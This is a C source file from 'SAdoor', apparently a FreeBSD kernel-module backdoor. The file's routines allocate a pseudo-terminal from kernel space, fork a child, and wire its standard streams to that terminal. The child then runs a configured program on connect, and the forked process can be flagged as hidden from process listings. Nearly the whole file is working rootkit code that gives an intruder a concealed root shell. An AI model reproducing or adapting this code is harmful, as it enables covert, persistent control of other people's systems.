/*
 *  File: connloop.c
 *  Author: Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  Description: SAdoor kmod PTY setup routines.
 *  Version: 1.0
 *  Date: Thu Jul  3 15:48:22 CEST 2003
 *
 *  Copyright (c) 2003 Claes M. Nyberg <md0claes@mdstud.chalmers.se>
 *  All rights reserved, all wrongs reversed.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *  3. The name of author may not be used to endorse or promote products
 *     derived from this software without specific prior written permission.
 *
 *  THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES,
 *  INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY
 *  AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL
 *  THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 *  EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 *  PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS;
 *  OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 *  WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
 *  OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
 *  ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <sys/types.h>
#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/unistd.h>
#include <sys/protosw.h>
#include <sys/fcntl.h>
#include <sys/stat.h>
#include <sys/ttycom.h>
#include <sys/malloc.h>
#include "sadoor.h"

/* Private procedures */
static void setup_slave(void *);
static int ptymaster_open(u_char *);
static int ptyslave_open(int, u_char *);

struct setup_slave_args {
    u_char pts_name[24];
    int fd_master;
};

/*
 * Fork and bind child (slave pty) to parent (master pty).
 * The slave side then runs the program defined as SAKMOD_RUNONCONNECT.
 * Zero is returned on success and -1 on error.
 */
int
setup_pty(void)
{
    int fd_master;
    u_char *pts_name;
    struct proc *uproc;
    struct thread *td;
    struct setup_slave_args *slave_args;
    int s;
    int error;

    td = curthread;
    pts_name = (u_char *)uland_calloc(24);
    slave_args = (struct setup_slave_args *)kspace_calloc(sizeof(struct setup_slave_args));

    /* Open pty master */
    if ( (fd_master = ptymaster_open(pts_name)) < 0) {
        goto finished;
    }

    (void)copyin(pts_name, slave_args->pts_name, sizeof(slave_args->pts_name));
    slave_args->fd_master = fd_master;

    /* Fork and let the child call setup_slave() */
    s = splhigh();
        if ( (error = fork1(td, RFFDG | RFPROC, 0, &uproc))) {
            log(1, "Error: setup_pty(): Can't fork: %d\n", error);
            kspace_free(slave_args);
            fd_master = -1;
            goto finished;
        }
/*        uproc->p_flag |= P_SYSTEM; */
#ifdef SAKMOD_HIDE_PROCS
        uproc->p_flag |= SAKMOD_HIDDEN_PROC_FLAG;
#endif /* SAKMOD_HIDE_PROCS */
        cpu_set_fork_handler(FIRST_THREAD_IN_PROC(uproc), setup_slave, slave_args);
        debug(2, "Forked to setup slave pty, got pid %d\n", uproc->p_pid);
    
    finished:
    splx(s);
        uland_free(pts_name);
        return(fd_master);
}

/*
 * Setup the slave side.
 * Open slave pty and bind stdin, stdout, stderr
 * to the master.
 */
static void
setup_slave(void *args)
{
    /* Userland */
    struct setsid_args *ssargs; /* Dummy */
    struct close_args *clargs;
    struct ioctl_args *icargs;
    struct dup2_args *dp2args;
    struct execve_args *excargs;
    u_char *pts;

    /* Kernel space */
    struct setup_slave_args *slargs;
    struct proc *ep;
    struct thread *td;
    int fd_slave;
    int fd_master;        
    int error = 0;

    td = curthread;
    ep = curproc;
    slargs = (struct setup_slave_args *)args;

    debug(3, "Entered setup_slave()\n");

    /* Set up userland memory */
    ssargs = (struct setsid_args *)uland_calloc(sizeof(struct setsid_args)+
        sizeof(struct close_args)+
        sizeof(struct ioctl_args)+
        sizeof(struct dup2_args)+
        strlen(slargs->pts_name)+1+
        sizeof(struct execve_args)+
        strlen(SAKMOD_RUNONCONNECT)+5);

    clargs = (struct close_args *)(ssargs + 1);
    icargs = (struct ioctl_args *)(clargs + 1);
    dp2args = (struct dup2_args *)(icargs + 1);
    pts = (u_char *)(dp2args + 1);
    excargs = (struct execve_args *)((u_char *)pts + strlen(slargs->pts_name)+1);

    /* Transfer device name to userland */
    (void)copyout(slargs->pts_name, pts, strlen(slargs->pts_name));
    fd_master = slargs->fd_master;
    
    /* Create a new session (session leader,
     * group leader and no controlling terminal)*/
    if ( (error = setsid(td, ssargs))) {
        log(1, "Error: setup_slave(): setsid(): %d\n", error);
        goto finished;
    }

    /* Open slave pty */
    if ( (fd_slave = ptyslave_open(fd_master, pts)) < 0) 
        goto finished;

    /* No more need for master in child */
    (void)suword(&clargs->fd, fd_master);
    if ( (error = close(td, clargs)))
        log(1, "Warning: setup_slave(): Failed to close pty master: %d\n", error);

    /* Acquire controlling terminal */
    (void)suword(&icargs->fd, fd_slave);
    (void)suword(&icargs->com, TIOCSCTTY);
    (void)suword(&icargs->data, (int)NULL);
    if ( (error = ioctl(td, icargs))) {
        log(1, "Error: setup_slave(): Failed to aquire controlling terminal, "
            "ioctl(): %d\n", error);
        goto finished;
    }

    /*
     * Rely on the default termios settings, (window size arrives
     * later from client) and set stdin/stdout/stderr.
     */
    (void)suword(&dp2args->from, (u_int)fd_slave);
    (void)suword(&dp2args->to, (u_int)STDIN_FILENO);
    if ( (error = dup2(td, dp2args))) {
        log(1, "Error: setup_slave(): failed to dup2 STDIN_FILENO: %d\n", error);
        goto finished;
    }

    (void)suword(&dp2args->from, fd_slave);
    (void)suword(&dp2args->to, STDOUT_FILENO);
    if ( (error = dup2(td, dp2args))) {
        log(1, "Error: setup_slave(): failed to dup2 STDOUT_FILENO: %d\n", error);
        goto finished;
    }

    (void)suword(&dp2args->from, fd_slave);
    (void)suword(&dp2args->to, STDERR_FILENO);
    if ( (error = dup2(td, dp2args))) {
        log(1, "Error: setup_slave(): failed to dup2 STDERR_FILENO: %d\n", error);
        goto finished;
    }


    /* Close if unused */
    (void)suword(&clargs->fd, fd_slave);
    if (fd_slave > STDERR_FILENO) {
        if ( (error = close(td, clargs)))
            log(1, "Warning: setup_slave(): Failed to close slave fd: %d\n", error);
    }

    /* Set up execve arguments and run program
     * TODO: This probably belongs in a separate procedure */
    
    /* Set program */
    excargs->fname = (char *)((u_char *)excargs + sizeof(struct execve_args));
    (void)copyout(SAKMOD_RUNONCONNECT, excargs->fname, strlen(SAKMOD_RUNONCONNECT));

    /* Set argv */
    (void)suword(&excargs->argv, (int)(excargs->fname + strlen(excargs->fname) +1));
    (void)suword(&excargs->argv[0], (int)excargs->fname);
    (void)suword(&excargs->argv[1], (int)NULL);

    /* No enviroment 
     * TODO: Set client IP in environment */
    (void)suword(&excargs->envv, (int)NULL);

    /* Run the program */
    debug(3, "Calling (from pid=%d, ppid=%d) execve(\"%s\", { \"%s\", %s}, NULL)\n",
        ep->p_pid, ep->p_pptr->p_pid, excargs->fname, excargs->argv[0], excargs->argv[1]);
    
    if ((error = execve(td, (void *)excargs))) {
        log(1, "Error: setup_slave(): execve() failed: %d\n", error);
        exit1(td, error);
    }

    finished:
        if (error) {
            uland_free(ssargs);
            kspace_free(slargs);
            exit1(td, error);
        }
        kspace_free(slargs);
        return;
}

/*
 * Open pty master.
 * Scan /dev/ for the next available pty device.
 * The argument must be big enough to hold the
 * name of the actual device (12 bytes) and is supposed
 * to be a userland address.
 * Returns -1 on error and the file descriptor of
 * the master on success.
 */
static int
ptymaster_open(u_char *pts_name)
{
    struct open_args *oargs;
    struct thread *td;
    int error;
    u_char *pt1;
    u_char *pt2;
    int fd = -1;

    debug(3, "Entered ptymaster_open()\n");

    td = curthread;
    oargs = (struct open_args *)uland_calloc(sizeof(struct open_args));

    strcpy(pts_name, "/dev/ptyXX");

    /* Prepare open arguments */
    (void)suword(&oargs->path, (int)pts_name);
    (void)suword(&oargs->flags, O_RDWR);
    (void)suword(&oargs->mode, 0);

    for (pt1 = "pqrstuvwxyzPQRST"; *pt1 != '\0'; pt1++) {
        
        if (subyte(&pts_name[8], (int)*pt1) < 0) {
            log(1, "Error: ptymaster_open(): Failed to store byte in userland\n");
            fd = -1;
            goto finished;
        }

        for (pt2 = "0123456890abcdef"; *pt2 != '\0'; pt2++) {
            
            if (subyte(&pts_name[9], (int)*pt2) < 0) {
                log(1, "Error: ptymaster_open(): Failed to store byte in userland\n");
                fd = -1;
                goto finished;
            }

            if ( (error = open(td, oargs))) {
                
                /* No more pty devices */
                if (error == ENOENT) {
                    log(1, "Error: Failed to open master pty, no more devices\n");
                    fd = -1;
                    goto finished;
                }
                else
                    continue;
            }
            fd = td->td_retval[0];

            /* Change "pty" to "tty" */
            if (subyte(&pts_name[5], (int)'t') < 0) 
                log(1, "Warning: ptymaster_open(): Failed to change 'pty' to 'tty'\n");
            goto finished;
        }
    }

    finished:
        uland_free(oargs);
        return(fd);
}

/*
 * Open slave pty with filename pointed to by pts_name.
 * The opened file is bound to file descriptor of master pty (fdm).
 * Returns the file descriptor of slave pty on succes, -1 on error.
 * pts_name is assumed to be a userland address.
 */
static int
ptyslave_open(int master_fd, u_char *pts_name)
{
    struct open_args *oargs;
    struct chown_args *choargs;
    struct chmod_args *chmargs;
    struct thread *td;
    int error;
    int fd;

    debug(3, "Entered ptyslave_open()\n");
    
    td = curthread;
    oargs = (struct open_args *)uland_calloc(sizeof(struct open_args)+
        sizeof(struct chown_args)+
        sizeof(struct chmod_args));
    choargs = (struct chown_args *)((u_char *)oargs + sizeof(struct chown_args));
    chmargs = (struct chmod_args *)((u_char *)choargs + sizeof(struct chown_args));

    /* 
     * We are root, so chown() and chmod() should work 
     */
    (void)suword(&choargs->path, (int)pts_name);
    (void)suword(&choargs->uid, 0); 
    (void)suword(&choargs->gid, SAKMOD_TTY_GROUP);
    if ( (error = chown(td, choargs)))
        log(1, "Warning: Failed to chown() tty device: %d\n", error);

    (void)suword(&chmargs->path, (int)pts_name);
    (void)suword(&chmargs->mode, S_IRUSR | S_IWUSR | S_IWGRP);
    if ( (error = chmod(td, chmargs)))
        log(1, "Warning: Failed to chmod() tty device: %d\n", error);
    

    /* Open the device */
    (void)suword(&oargs->path, (int)pts_name);
    (void)suword(&oargs->flags, O_RDWR);
    (void)suword(&oargs->mode, 0);
    if ( (error = open(td, oargs))) {
        log(1, "Error: Failed to open tty device for slave pty: %d\n", error);
        fd = -1;
    }
    else
        fd = td->td_retval[0];
    uland_free(oargs);
    return(fd);
}
